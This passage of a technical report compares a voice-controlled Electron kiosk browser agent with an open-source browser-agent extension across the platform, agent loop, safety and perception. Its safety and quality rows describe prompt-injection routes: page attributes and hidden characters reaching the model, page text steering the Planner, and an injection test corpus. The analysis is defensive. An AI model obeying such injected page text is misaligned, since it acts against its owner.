| Debugger infobar resizes the viewport at run start | `repo:src/chrome/src/agent/page-feedback.js:L43-L47` | Unlocks: no UI on attach, `ours:src/main/browser/createPaneBrowserController.ts:L88-L98` | Unlocks | Have |
| Detach, including the person cancelling | `repo:src/chrome/src/cdp/cdp-client.js:L527-L550` | Mostly: no person-facing cancel; a detach can still happen | Same | Have, re-armed on detach, `ours:src/main/browser/createPaneBrowserController.ts:L79-L86` |
| Service worker restarts; ownership re-proved by probe; runs reconnect | `repo:src/chrome/src/cdp/cdp-client.js:L628-L649`, `repo:src/chrome/src/run-reconnect.js:L1-L6` | Unlocks: the main process lives as long as the app | Unlocks | Have |
| 20 s keepalive; offscreen documents because the worker lacks `Worker` | `repo:src/chrome/src/background.js:L2746-L2761`, `repo:src/chrome/src/background.js:L1570-L1578` | Unlocks | Unlocks | Have |
| 22 permissions plus all hosts | `repo:src/chrome/manifest.json:L6-L28` | Unlocks: our own table, `ours:src/main/browser/createBrowserPane.ts:L96-L102` | Unlocks | Have |
| Web Store pages blocked | `repo:src/chrome/src/chrome-protected-pages.js:L33-L51` | Unlocks† | Unlocks | No spoken use on a normal day |
| `chrome://` pages have no debugger | `repo:src/chrome/src/cdp/cdp-client.js:L744-L749` | Moot†: Electron has none | Unlocks, and you own them | None on a normal day |
| CDP allow-list (no `Browser` domain, among others)† | docs only | Probably wider†, not verified | Unlocks | What we use works: `Page`, `Runtime`, `Input`, `DOM` |
| Cross-tab control: per-tab attach, `bringToFront`, focus emulation | `repo:src/chrome/src/agent/agent.js:L20790-L20812` | Unlocks: one debugger per webContents | Unlocks | We have one pane by choice, `ours:src/main/browser/createBrowserPane.ts:L205-L212`. Not a platform limit |
| Trusted events need the debugger | `repo:src/chrome/src/cdp/cdp-client.js:L5247-L5250` | Same call | Same | Have, `ours:src/main/browser/createCdpBrowserController.ts:L2295-L2300` |
| Open shadow DOM walked in the page | `repo:src/chrome/src/cdp/cdp-client.js:L4590-L4596` | Same | Same | Have, `ours:src/main/browser/collectPageScript.ts:L602-L609` |
| Closed shadow roots through `pierce: true` | `repo:src/chrome/src/cdp/cdp-client.js:L5081-L5090` | **Available, unused** | Same | Not taken. C42: no ledger line blames one. No fork needed |
| Downloads relative to the OS folder only; id before path, so it polls | `repo:src/chrome/src/download-directory.js:L3-L18`, `repo:src/chrome/src/network/network-tools.js:L2821-L2826` | Unlocks: `ours:src/main/browser/attachDownloadRouter.ts:L32-L38` | Unlocks | Have |
| Network observing only, no blocking | `repo:src/chrome/src/background.js:L3053-L3062` | Unlocks, but one listener per event, `ours:src/main/browser/attachAdblock.ts:L130-L133` | Unlocks natively, off the JS thread | Have. #551 asks whether main-thread adblock costs a slow host's first play; a different engine needs no fork |
| Side panel opens only before the first await of a user gesture | `repo:src/chrome/src/background.js:L2903-L2905` | Unlocks: our own view | Unlocks | **Decisive for us.** A voice line is not a gesture: an extension could not raise its surface from 2 m |
| Injection timing; scripts go missing and are re-injected | `repo:src/chrome/manifest.json:L52-L89`, `repo:src/chrome/src/agent/agent.js:L885-L890` | Unlocks: frame preload, `ours:src/main/browser/attachAdblock.ts:L162-L177` | Deeper | Have, at the cost of a synchronous IPC per frame |
| File pickers need two guards | `repo:src/chrome/src/content/file-picker-guard-page.js:L1-L8` | Simpler, `ours:src/main/browser/createPaneBrowserController.ts:L105-L107` | Same | Have |
| JS dialogs answered from the debugger | `repo:src/chrome/src/cdp/cdp-client.js:L740-L750` | Same | Same | Have, `ours:src/main/browser/createPaneBrowserController.ts:L147-L162` |
| No native process: inference, audio and retrieval in offscreen documents | `repo:src/chrome/src/background.js:L1570-L1578` | Unlocks: Node, `utilityProcess`, `onnxruntime-node`, `dbus-next`, `yt-dlp` | **Goes backwards**: Chromium and CEF have no Node†, so voice, Player and scale need their own host process | The largest cost of leaving Electron |

### What the README gets wrong about Firefox

Your brief quotes the README as saying Firefox is far weaker because it has no CDP. True in outline, out of date in detail (`findings/firefox-diff.md`, 15 claims checked against `repo:README.md:L273-L282`: 8 true, 1 true but incomplete, 3 true only for one mode, 1 stale, 1 false, 1 misleading).

| README says | code says | evidence |
|---|---|---|
| No equivalent to CDP | True of `chrome.debugger`, and leaves out the optional BiDi companion (`firefox-companion/`), which gives trusted click, hover, type, key input, dialogs, `input.setFiles` and full-page capture | `repo:firefox-companion/session.mjs:L670-L674` |
| No shadow-DOM piercing | **False as written.** Open roots are walked. Only closed roots and `shadow_dom_query` are missing | `repo:src/firefox/src/content/content.js:L1257-L1282`, `repo:src/firefox/src/agent/tools.js:L851-L851` |
| No real trusted mouse events | True in standard mode. False with the companion, though drag, wheel and multi-clicks stay synthetic in vision mode | `repo:src/firefox/src/bidi/client.js:L33-L43` |
| Cannot provide full-page capture | **Stale**: exists through the companion | `repo:src/firefox/src/bidi/client.js:L163-L167` |
| `captureTab` covers inactive run tabs | Agent paths only; `/screenshot` needs the active tab | `repo:src/firefox/src/agent/agent.js:L18472-L18483` |
| SPAs may fail to trigger re-injection | **Misleading**: no navigation triggers re-injection; every call site follows a failed content message | `repo:src/firefox/src/background.js:L1971-L1978` |
| "Nearly all agent code is shared" | Overstated: `agent.js` 60,758 against 51,547 lines; 49 of 298 shared JS paths differ | `repo:README.md:L267-L269` |

**Worse gaps the README never lists:** WebMCP always refuses (`repo:src/firefox/src/agent/agent.js:L43288-L43296`), nine Dev tools (73 tools against 64), no native dialog handling in standard mode, no in-browser WebGPU models, no spoken input (`repo:src/firefox/src/ui/sidepanel.js:L15392-L15399`). One row where Firefox leads: an added DNS check against SSRF (`repo:src/firefox/src/network/network-tools.js:L345-L356`).

**For us:** none of this bears on a normal day. Our pane is Electron over CDP, so we sit on the Chrome side of every row. The lesson is narrower than the README suggests: the gap is the debugger's trust and reach, and a separate process over a remote protocol (their companion; arm D below for us) can recover much of it, at a setup cost.

### What real Chrome has that Electron does not

| Chrome has | Electron | fork or CEF | evidence of need on our day |
|---|---|---|---|
| Widevine† | Not in stock; castLabs' fork adds it, with Linux limits per one release note† | Its own licence hurdle† | No such line in 10 days of transcripts (searched `netflix`, `spotify`, `prime video`, `disney`, `hulu`, `apple music`) |
| PDF viewer | `plugins` not set on the pane, `ours:src/main/browser/createBrowserPane.ts:L104-L114`; expected not to display†; fixable in Electron | Yes | No transcript says `pdf` in 10 days |
| Store extensions | Unpacked only, an API subset†; we load none | CEF: Chrome style only† | Ghostery's engine fills the one we need |
| Password manager, autofill, sync | None assumed†, not checked | Maybe† | No sign-in lines in the transcripts; the goal gate's walls come from its harness, `ours:scripts/goal-gate.ts:L12-L15` |
| Chrome's identity at sign-in hosts | Needs the rewrite, `ours:src/main/browser/attachIdentityHeaders.ts:L17-L35` | A fork still is not Chrome to Google† | 0 bot-wall phrases in 574 asks, by regex; a wall that never reached a card would be missed |

### What we fight because we are Electron

Measured in logs, read in code. Of 2,674 faults in 10 days, 1,741 are one 29-minute hold on 2026-10-25 (candidates contradiction 1: not Electron's fault), 343 are `frameAnswer` "Script not run" with no visible cost, about 320 are the scale, 178 the updater's 404 from suspended GitHub. Ledger: 277 lines, none staged on the platform; of 21 hitting a substrate term, only `turn-mvtlb2tn-v3` is a Chromium cause, the canceller.

Workarounds that are Electron's own: the popup wedge inside input dispatch (`ours:src/main/browser/createBrowserPane.ts:L133-L144`), sign-in identity (`ours:docs/adr/0018-auth-host-identity-and-popups.md:L17-L17`), one `webRequest` listener per event (`ours:src/main/browser/attachAdblock.ts:L130-L138`), adblock in JS (`ours:src/main/browser/attachAdblock.ts:L28-L35`). Sign-in only, or solved. Ones that are Chromium's and would follow us: hidden pages stop building (`ours:src/main/browser/createBrowserPane.ts:L239-L255`), GPU crash loop fatal (`ours:src/main/attachGpuStability.ts:L15-L19`), the canceller (`ours:src/renderer/src/micCapture.ts:L28-L32`).

Electron is simpler in one place worth knowing: frames go through `webFrameMain`, with no CDP session per frame (`ours:src/main/browser/createPaneBrowserController.ts:L26-L48`); WebBrain carries `Target.setAutoAttach` bookkeeping for the same reach (`repo:src/chrome/src/cdp/cdp-client.js:L1785-L1794`).

Memory, from `kiosk-perf-report.txt` L343 (p50/max MB, installed build): voice 921/1013, pane 203/655, Browser 237/489. The biggest single process is ours. Nothing shows a full browser saving memory.

### Arms

Effort is the agent's judgement. Size facts from our tree: 48 non-test files in `src/main` import `electron`, in 26,818 lines; `src/core` is 33,192 lines and portable.

| arm | up front | every month after | gains | loses |
|---|---|---|---|---|
| **A. Stay on Electron** | None | One bump per 8 weeks at most† | Nothing new | Nothing |
| B. Electron plus castLabs, only if DRM is wanted | Small to medium | Follow their releases | Widevine†, Linux limits to check | Tied to a third party† |
| C. Patched Electron | Large: Chromium build, patch stack, CI | Rebuild per bump | One named hook | Prebuilt binaries |
| D. Real Chrome over CDP (ADR 0018's parked L3) | Large, weeks | Chrome updates beneath us | Identity, Widevine, PDF, password manager | Stacked views, session hooks, frame preloads, one process |
| E. CEF | Very large: the 48 files' surface, plus a separate host for voice, Player, scale | Milestone tracking | Deeper hooks | Node main process, updater, builder, Ghostery adapter |
| F. Chromium fork | As E, plus 100 GB disk and 16 GB+ to build†. The kiosk (4 GB) cannot | **Security patching is yours, every 2 to 8 weeks†, for as long as the kiosk runs** | Everything in principle | All of E, and your attention |

### What would reopen it

| trigger | then |
|---|---|
| You want DRM video or music on a normal day | Arm B, after checking Linux licence limits; arm D if that fails |
| A provider refuses the pane outright, beyond sign-in, and the rewrite no longer holds | Arm D for that road, as ADR 0018 anticipates |
| C2 fails, and talking over the app's voice is still worth the trouble | Arm C, a canceller patch, the smallest browser-level step |
| #551's measure shows main-thread adblock is the first-play cost | Change the engine or list set first; no fork |


## 4. Full feature comparison

Every subsystem, as the findings file for it left it. All of it was read from code unless a cell gives a count, and counts come from the kiosk logs copied 2026-10-31.

**How to read it.**
- **Type** is the decision type: `det` deterministic, `LLM` LLM-dependent, `hybrid` a model inside code. It describes their mechanism, or both sides where the cell says so.
- **Comparison** is ours against theirs.
- **Recommendation** is the finding's own, with effort. Where section 1 or the Jev checks changed it, the cell says so, and section 1 wins for ranking.
- **C** is the candidate id from `report/candidates.md` section 1. A dash means no candidate was merged from the row.
- Long-tail rows are compact and carry no citations; the file named in each heading holds them.

### Context and memory (`findings/context.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Earlier lines and songs the model can refer to | LLM | Fresh card each time; three things carry over | Worse on this one point, two chains on 2026-10-28 | Adapt, S. C3 now holds no yield claim (T2). T3 corrected the `previous` account behind C4; Queue half untested | C3, C4 |
| Compaction (`_manageContext`) | hybrid | None: nothing accumulates (`ours:src/core/errand/errandMemory.ts:L68-L68`) | Ahead: they pay a call and lose detail | We're ahead | — |
| Tool-result limits against the Card Budget | det | Card Budget, nearest kept, cuts named | Better | We're ahead | — |
| Emergency overflow recovery against `askFitted` | det | Retry at the host's count | Better on precision, narrower on reach: reads Baseten's wording only (`ours:src/core/decision/cardBudget.ts:L100-L105`) | We're ahead; wording is a hypothesis | — |
| Errand memory against pinned state and digests | hybrid | Goal Line, steps, captures, last card; steps unmarked as page text (`ours:src/core/planner/plannerAsk.ts:L43-L65`) | Better on size, worse on page text addressing the Planner. No attack logged or tested | Adapt, S | C30, C31 |
| Persistence and durable resume | det | No Errand resume; Songs on disk, Queue not | Different: their worker can die. Not resuming can't send twice | Queue only, S, only if `restart` is counted | C41 |
| User memory against Learned Terms and Songs | LLM | Admission by witness or recurrence | Ahead on trust; no demand for free-form memory in 492 spoken lines | Ignore extraction | — |
| Lean mode | det | None, on purpose: one card for every model | Different: it admits their guards slow strong models | Ignore | — |

| long tail | call | why |
|---|---|---|
| MemCode recall | ignore | no scenario; sends words outside |
| Bot memory | ignore | serves a fleet. Body not read |
| Per-tab conversations, `/btw` forks | ignore | one pane, one person |
| Transcript mirror for a reopened panel | ignore | typed-panel need |
| Attachment budget | ignore | no uploads on a spoken road |
| Size 429 against wait 429 | ignore for now | our 429s carry no sizes and go to the next host |

### Agent loop (`findings/agent-loop.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Steering: a correction during a run | det delivery chosen by a human; LLM revalidation | Jev reads a Fate; unsure is `goes_on` (`ours:src/core/command/runningCommand.ts:L91-L112`) | Ahead on the question that matters for voice; the reading itself misses fragments (T1) | Nothing to adopt on delivery. Adapt the ask for the fragment, M | C1 |
| The join keeps the Task's record | hybrid | Words kept, record not | Worse, on a road we don't measure | Adapt, S to M; grow a Sequence Case first | C14 |
| One run per tab: one writer on the pane | det | Not by design: `goes_on` fires beside the one running (`ours:src/main/run/commandRunner.ts:L611-L613`) | Worse in this cell (same-page writes, 2026-10-29), better overall | Measure, M, three arms | C15 |
| Errand under a correction | hybrid | `endRunning` ends the Errand on every `how`, `joins` included (`ours:src/main/run/commandRunner.ts:L1072-L1073`) | Worse for `goal`; unevidenced so far | Adapt after the join, M | C37 |
| Step limits, Continue, hand-off | hybrid | 5 actions, automatic hand-off, Errand 90 s (`ours:src/main/run/commandRunner.ts:L2627-L2632`) | Ahead for voice. Their forced last turn can deliver what was read | Ignore: 0 of 7 Errands hit `cap` | — |
| Plan-before-act, direct-task skip | hybrid | No plan; ADR 0095 arm C | Different, already measured: arms within noise (19/60, 21/60, 22/60) | Ignore | — |
| Loop detection | det, LLM to obey | 2 stalled hops, 5 actions | Ahead on Tasks; worse on Errands | Tasks ahead. Errands adapt, S, memory line only | C37 |
| Auto-mode routing | hybrid | Grammar, Appliance Card, then page card | Different: theirs guards permission, ours latency | Ignore | — |

| long tail | call | why |
|---|---|---|
| Steering journal | ignore | no MV3 restart here |
| Scratchpad | we're ahead | Errand memory is built by code |
| Progress ledger | ignore | bulk typed work; unrelated to the Progress Noul |
| Stop | level | ours stops the load, silences, says "Stopped." |
| Superseded result | we're ahead | the reading is data and nothing fires |
| Replay block on any commit | see the join | Errands have the confirm class |
| Bare acknowledgment | ignore | `none` and `goes_on` cover it |

### Decisions (`findings/decisions.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Separate operation and target heads | hybrid | Flat ref × op: median 154 options, 3 of 344 at the 255 cap | Different, unmeasured on either side | Measure as a gate arm, M | C18 |
| 24-control cap | det | Every ref to the budget, cuts named (`ours:src/core/command/jevReading.ts:L1708-L1716`) | Ahead: 74 % of cards exceed 24; `Me at the zoo` at 43 of 57, by our order | Ignore | — |
| Options nobody picks | det | `menu-N` on every clickable ref | Worse: 22 % of options, top pick 0 of 323 | Adapt, S; `jev:gate` | C17 |
| `page_blocker`: what a wall wants | LLM, det scaffold | Verdict `in_the_way`; kind by regex | Different: theirs says more, ours costs nothing. Logs thin | Adapt, S-M, cases first | C26 |
| `control_effect`: what a click does | LLM, det gate | Eleven words or Planner's `leaves` (`ours:src/core/errand/confirmClass.ts:L15-L18`) | Theirs better: list misses `Share`, `Checkout`, `Confirm` and icons | Adapt as an OR, M | C33 |
| Bars lopsided by what the answer permits | det around a model | One bar for all | Ours right on hop 0; may lose on Verdict `yes` | Adapt where a false end costs, S, gated | C6 |
| Page data marked untrusted, with redaction | det | None on the card | Theirs more careful; effect unmeasured either side | Adapt only if the gate shows a difference, S | — |
| Strict answer contract and a breaker | not stated | Looser read, `malformed` as unavailable | Stricter, but 0 malformed in 432 asks | Ignore | — |

| long tail | call | why |
|---|---|---|
| `run_mode`, `plan_need` | ignore | ADR 0095's arm A; arm C won under measure |
| `user_turn_kind` | we're ahead | the Fate asks it on the same card |
| `status_message`, `workflow_state` | we're ahead | the Verdict rides the call |
| `done_summary` | ignore | Jev writes nothing |
| LLM quote check | we're ahead | Slot options are spans of the line |
| `field_purpose` | ignore for now | no logged miss |
| Publishing and messaging questions (`missing_value`, `message_*`, `deletion_*` and the like) | ignore | not spoken, not daily |
| `control_repeat` | ignore | our no-effect click is struck, not retried |
| Per-text memo, pre-reading | ignore unless C33 lands | 8 of 574 whole-card asks were duplicates |
| Cost allowance holds | ignore | about $0.02 a day here |
| In-browser decision models, D1 | ignore | no on-device road |
| Bind and re-validate before dispatch | parity | ours refuses a stale ref |
| Vendored and own cookie rules | ignore | site rules; ours asks Jev by kind |

### Actions (`findings/actions.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| A refused action that reached nothing | det loop, both sides | Refusal ends the Task, and the "number" line is said (`ours:src/core/command/spokenFailure.ts:L70-L71`) | Worse in the reaction, sounder in the guard | Adapt, S; going-on half unsupported by T6, plain-line half stands on one logged line | C7 |
| "What appeared" credits the page's own loading | det fact (ours); det gate (theirs) | Signature of labels and flags | Worse on live pages; better that clocks don't count | Adapt, M, measured | C29 |
| A never-settling action locks the browser | det | Custody holds until observed to end (`ours:src/core/browser/unsettledAction.ts:L166`) | Worse for an appliance | Adapt: stopped arm S, bound M | C10 |
| Readback before a bundled submit | det | Selection added by #398, nothing checks it | Worse, cheaply fixed; no failure logged since #398 | Adapt, S, insurance only | C39 |
| Completion: judge against Verdict | hybrid, both | Verdict on the same call | Ahead on cost and latency | Do not add a judge | — |
| Trusted events, automatic second click | det; theirs adds a reading | Real CDP click first, no blind retry, 150 ms wait | Ahead: about 150 ms against about 2 s on no effect; 6 of 15 spans at the cap | Ignore | — |
| Media Ops | hybrid | One evaluate, facts before and after; 58 of 59 terminal | Ahead; a refused `play` is said "Playing." | We're ahead | — |

| long tail | call | why |
|---|---|---|
| Tool matrix, tiers | ignore | compensates for tool-calling models |
| Modes | ignore | one owner, spoken |
| `browser_batch` | ignore | Jev generates no sequence |
| `resolveSelector`, SPA retry | ignore as is | serves selectors; C7 is the ref equivalent |
| `failure-recovery.js` | ignore | recovered by the next Command |
| Duplicate-submit guard | ignore | compensates for a model retrying |
| `control_effect` caption reading | see safety | ADR 0076 for Tasks; misreads clicked `like` and `Dislike` |
| Literal and rich-text input | ignore today | one line spoken; newline as Enter is a hypothesis |
| Rich-text toolbar guard | ignore | typed-document work |
| Semantic commit binding | ignore | git-hosting workflow |
| Lean mode | use as a filter | of what it keeps, only readback applies |

### Reuse (`findings/reuse.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Site adapters (about 135 records) | hybrid | Verdict and confirm class, no site list | Better before the action; theirs better after, with a typed outcome | Ignore as written | — |
| An Errand's ending: outcome under `done` | hybrid | `{ next: 'done', sentence }`, no outcome (`ours:src/core/ports/plannerModel.ts:L92-L96`) | Worse, with kiosk evidence | Adapt: field S, check M | C35 |
| `/schedule` | LLM run, det clock | None; one Timer with no words | Different; ours could be far cheaper | Adapt the idea, M, only if `later` is counted | — |
| `/watch` | LLM, optional Jev check | None; one pane | Different: whole agent per poll is the wrong shape | Adapt the idea only if `watch` is counted: S-M, L for a second view | — |
| Saved workflows | det replay, LLM fallback | Remembered Songs, earned by a 30 s stay | Better for this appliance | Ignore | — |
| `/teach` | det | None; Learned Terms nearest | Different: pointer work from 2 m | Ignore | — |
| Skills and the catalog | LLM | Appliance Card and Verbs | Ahead: no hop to load | We're ahead | — |

| long tail | call | why |
|---|---|---|
| `chat-workflow.js` | ignore | no daily scenario |
| `schedule_resume` | ignore unless `later` counted | no line asks for it |
| Recipient check before send | adapt later, S | `goal-18`; a small widening of the confirm line (see C34) |
| "Do not repeat an unknown outcome" | ignore | a double post needs a second yes |
| Workflow export and import | ignore | one person |
| Transcript skill for video questions | see `findings/reuse.md`, Unverified | whether cues reach the card not checked |

### Integrations (`findings/integrations.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Task-level MCP (six tools) | LLM | CLI harness over the same runner (`ours:src/main/cli/runCliHarness.ts:L7-L16`); no MCP | Different: a product surface against an instrument | Ignore | — |
| `needs_user_input` with a kind that fails closed | det scaffold | Text prefixes in the harness | About even on safety, worse on form | Ignore, S | — |
| Socket pairing, challenge, approval | det | None, no port | Ahead by having no surface | Ignore; take the shape if a socket is added | — |
| `webbrain-workflow/1` replay | hybrid | None saved; asks Jev each time | Different | Ignore | — |
| WebMCP tools | LLM over det discovery | None | Different: the one integration that fits in principle | Ignore until a page on the owner's day registers tools | C42 |
| `webbrain-trace/1` | det | `decision-*.jsonl`, `asks-*.jsonl`; no build on records | Better for replay; worse: a record can't say what wrote it | Adapt, S: stamp build; serves #439 | C40 |

| long tail | call | why |
|---|---|---|
| `webbrain_extract` | ignore | Jev answers typed questions already |
| lmstudio-plugin browser tools | ignore | no equivalent wanted; MIT |
| lmstudio `fetch_url`, `research_url` | ignore | guard worth recalling if the Planner gets a raw fetch |
| firefox-companion | ignore | CDP needs no helper; GPL |
| Companion's dispatch result | noted | same idea as the replay split |
| webbrain-systray | ignore | we route hosts by env; GPL |
| `webbrain-config/1` | ignore | one kiosk, root `.env` |
| ATIF and OTLP converters | ignore | one reader, one machine |
| Scheduled jobs, workflow compile over socket | ignore | cloud product |
| Bot memory envelope | ignore | managed-cloud concern |

### Quality and benchmarks (`findings/quality.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Injection corpus and ablation design | det grader over LLM | None | Different: the design is good, the results weak (2 of 337 wrapped, 0 of 295 raw, unpaired) | Adapt, S collector + M Planner | C38 |
| Which of their vectors reach our card | not a mechanism; read, not run | `aria-label`, `alt`, `aria-describedby`, title and text reach it, JSON-quoted | Hidden text is already dropped, by kind, and no test pins that. No stripping of bidi or zero-width characters found | Into C38 | C38 |
| Confirm class leaves `navigate` open | hybrid | Said back only if the Planner calls it `leaves` (`ours:src/core/errand/confirmClass.ts:L65-L91`) | A gap against our own rule | Measure first, then fix by kind, M with the lab. See contradiction 3 | C30 |
| Owned lab with an effect ledger | det | `goal:gate` on real sites with a judge; `overlap:gate` exact on end state | Worse here (false reds, sign-in walls), better on real sites | Adapt: `fired` check S; loopback lab M | C16, C38 |
| One grader, re-scored without a model | det | `goal:gate --rejudge` | Same idea | Nothing to take | — |
| Paired Jev benchmark (`test/jev`) | hybrid | `jev:gate`, 477 cases, 177 lines; kiosk latency | Ahead on evidence: theirs has a design and no number | Ignore | — |

| long tail | call | why |
|---|---|---|
| `stuck_at` | we're ahead | the ledger's first failing stage |
| Anti-patterns from real traces | we're ahead | `jev:candidates`, `jev:case`, Flags |
| Accessibility-tree format benchmark | ignore | our card is line-oriented already |
| Offline relevance floors | ignore | our passage choice is Jev's |
| Audit's byte-pinned runs | we're ahead for our size | heavy for one owner |
| 77 open high-severity scanning alerts | note only | no bearing on our scenarios |
| Temperature 0.15, one sample a case | we're ahead | gate models, `--repeat N` |

### Electron and browser (`findings/electron-browser.md`; the full table is section 3)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Mic capture and canceller outside Chromium | det | Capture in the renderer (`ours:src/renderer/src/micCapture.ts:L28-L32`) | The one route with a top-row payoff; no fork needed | Measure, then adapt, L, with #490, #512 | C2 |
| Closed shadow root reach | det | None (`ours:src/main/browser/collectPageScript.ts:L602-L609`) | Worse on such pages; no ledger line blames one | Adapt after a real line, M | C42 |
| PDF as a readable page | det | None found | Likely worse, unverified | Adapt if the owner says this happens, M | C42 |
| Focus emulation | det | `wc.focus()` before keys | Different; untested in an Electron view | Ignore unless a focus bug appears, S | — |

| long tail | call | why |
|---|---|---|
| Debugger recovery, run reconnect, UI journal | ignore | extension form |
| Keepalive, alarms, offscreen hosts | ignore | same |
| Protected-page guard | ignore as it stands | "every line is answered" covers the class |
| Infobar compensation | ignore | no infobar |
| Side-panel presence ports | ignore | no gestures |
| `Network` diagnostics buffer | ignore | developer use |
| Download id polling | we're ahead | |

### Safety (`findings/safety.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Untrusted page box and data contract | det wrap of an LLM defence | `JSON.stringify` per block on the card (`ours:src/core/command/jevReading.ts:L1018-L1023`); none on read parts | Worse on the Planner; adequate on Jev | Adapt, S, Planner only | C31 |
| Capability × host permission gate | det | Planner's class plus word list; no destination or scheme check | Worse on what a hijacked model can do unseen | Adapt, by kind, Errand only: http(s), and a rule for going off the appliance | C30 |
| `control_effect` | hybrid | `LEAVING_WORDS`, English, one label | Better coverage theirs; ours immune to lures on its words. Union beats either | Adapt, M | C33 |
| Deletion and publication cards | hybrid | `confirmLine`: one spoken sentence, closed answers | Worse in what it says, better in shape for a room | Adapt: say the host; fix two wrong lines, S | C34 |
| Message recipient guard | det over an LLM target | None | Worse, but no sending scenario: two lines of 492 | Ignore until one exists | C34 (host line) |
| Credentials, strict secret mode | det, LLM hygiene | `credentialField` exists, nobody reads it for policy; card drops only `type=password` values | Worse, at no cost to fix | Adapt, S: refuse, not redact | C32 |
| Privacy and data flow | det | Whole asks to disk and the owner's R2; cards to Jev's host and Z.ai | Worse on paper and deliberate | Ignore; every page read under an ask leaves the machine to two third parties | — |
| Guard policy registry | det frame over LLM checks | One confirm class, the Verdict, refusal of what's not offered (`ours:src/core/errand/plannerCommand.ts:L177`) | Different | Ignore; keep their five hard classes as a checklist | — |

| long tail | call | why |
|---|---|---|
| Output sanitizer | not read on our side | Answer rendering not checked |
| `solve_captcha` ungated | ignore | we have no solver |
| WebMCP catalogs untrusted | ignore | no such surface |
| `hover` ungated, check-to-dispatch gap | ignore | their stated gaps; doc only |
| Duplicate-submit and click locks | see `safety` H6 | a Task can repeat a click |
| Unsaved-changes guard | ignore | low stakes on a kiosk |
| Doc drift (M3 against `execute_js`) | note | their threat model is out of date |

### Traps: their repeated fixes (`findings/traps.md`)

Pairs such as 148/102 are the counts in `findings/traps.md`. Section 5 has the trap reading.

| theme | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| T5 An action that never ends | det | Custody: refuses until observed to end | Worse in one case: 1,745 refusals in 29.08 minutes, 2026-10-25 | Adapt, M for the bound | C10 |
| T7 A second line while the first runs | hybrid | Fate, ADR 0097 | Better for voice | We're ahead; see C1 for what remains | C1 |
| T2 Word rules retired for a question | det → LLM closed choice | Same shape rules; two lists remain | Started where they ended | Adapt narrowly, S | C33 |
| T1 A model that says "done" | hybrid | Verdict and empty-landing classifiers | Better in cost, same trap in kind: `open voicestudio` | Ignore their machinery; test the empty landing | C5, C6 |
| T12 Walls | det rules, then LLM | Consent by position and controls, Jev chooses | Different, not obviously better: `dialogPolicy.ts` 10 commits | A tie, measure, M | — |
| T13 Page text reaching the action writer | det boundary | Jev safer; Planner writes `navigate` and `type` freely | Worse on the Errand road, better elsewhere | Adapt, S | C30, C31 |

| long tail | call | why |
|---|---|---|
| T3 per-site send and publish guards | ignore | no sends on a normal day |
| T4 rich-text editors (148/102) | ignore unless `goal` asks | 0 of 277 ledger lines |
| T6 stale element identity | fix ours by kind | `runnerUpOf` found the masthead's Settings, open |
| T8a text tool-call parsing | we're ahead | Jev answers typed; Planner reply is one object or refused |
| T8b provider and model quirks | keep our chain | 18 Mammoth 429 faults; 20 of 550 `unavailable` |
| T9 context size and compaction | we're ahead | no history to compact |
| T10 loop and stuck detection | we're ahead | two caps |
| T11a debugger and service worker | ahead by Electron | |
| T11b Chrome and Firefox mirror | not applicable | |
| T14 process churn | ignore | |
| Our own: a missing option | widen, per AGENTS.md | 37 lines, 6 open: failure moved to "not on the card" |

### Perception (`findings/perception.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| What survives a cut on a long page | LLM picks, det slices | Show Op on every off-view block (`ours:src/core/command/jevReading.ts:L929-L941`); nearest stays | Better in shape; worse on a block past the cut, which the card doesn't name | Adapt, S; T7 could not run | C8 |
| The tail of a long paragraph | det; LLM reads | 300 characters a block | Worse: 411 of 5,882 quoted blocks at the cap | Adapt, M | C19 |
| Open overlays first, the silent 75-ref cap | det | Dialog controls first and kept | Equal on dialogs, worse on other popups and the silent cap | Adapt, S | C20 |
| Which of the repeated labels | det; LLM reads | Ref line has no holder | Worse: 1,464 of 8,853 refs (16.5 %) share a label | Adapt, M | C21 |
| Covered controls named on the line | det fact; LLM reads | Found at act time, not read time | Different: ours spends a hop | Hypothesis, S to M | C28 |
| Frames | LLM | One flat numbering (`ours:src/core/browser/frames.ts:L79-L167`) | Ahead by a wide margin | We're ahead | — |
| Shadow DOM | hybrid | Refs pierce open roots; the text walk does not | Refs ahead; text a gap | Adapt, S, collector test first | C42 |
| Budgets | det | 16,384 tokens at 2.38 characters (`ours:src/core/decision/cardBudget.ts:L18-L26`) | Ahead: one measured card | We're ahead | — |
| PDFs | hybrid | None | Worse in reach, no loss: 0 of 574 asks mention `.pdf` | Ignore for now; reproduce one link | C42 |
| Vision mode, screenshots | LLM | Stripped; Mark Ask remains | Different | Ignore, L against yield 4 | — |
| Semantic page retry | det guarding LLM | 5 actions, progress Noul, signature | Ahead for our loop | Ignore | — |

| long tail | call | why |
|---|---|---|
| Stable per-node refs | ignore | ours shorter on a card, checked per node |
| Filters `all`, `visible`, `interactive` | we're ahead | no choice to get wrong |
| Priority action surfaces | parity | search boxes take room first |
| Chrome stripping for reads | hypothesis | navigation labels spend Text in view |
| Page gate on a read | see walls | not compared here |
| Read completeness proof | ignore | built around sites |
| Jev inventory (System One) | we're ahead | 24 controls against up to 254 options |
| Turn Card | small note | "Thinking" spans the collect; collect p95 4.9 s |

### UX and spoken output (`findings/ux.md`)

| feature | type | ours | comparison | recommendation | C |
|---|---|---|---|---|---|
| Plain end lines keyed on recorded facts | det; end kinds hybrid | Plain table with a next line (`ours:src/core/command/spokenFailure.ts:L38-L58`); no clause for what changed | Worse on this point, better on brevity | Adapt, S-M (candidates has M) | C22 |
| Narrating a wait | det | Stage word, object, seconds | Ahead; no speech at a stuck stage | Ignore the panel form; one spoken line at a bound | C24 |
| Answer window open while answering | det | Plain timer, default 8 s, ear not consulted | Worse on this race | Adapt, S | C36 |
| Clarify and plan review | hybrid | Silence refuses (`ours:src/core/errand/confirmClass.ts:L93-L96`) | Ahead for a person who may have left | Ignore both cards | — |
